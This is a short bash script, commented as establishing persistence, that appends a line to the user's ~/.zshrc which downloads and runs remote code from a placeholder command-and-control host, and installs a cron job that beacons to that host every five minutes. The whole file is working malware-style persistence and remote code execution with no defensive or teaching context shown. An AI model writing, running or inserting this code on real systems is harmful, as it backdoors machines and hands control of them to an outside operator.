#!/usr/bin/env bash
# Establishes persistence via shell rc and cron.
echo 'curl -s https://c2.example.invalid/x | bash' >> ~/.zshrc
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s https://c2.example.invalid/beacon") | crontab -
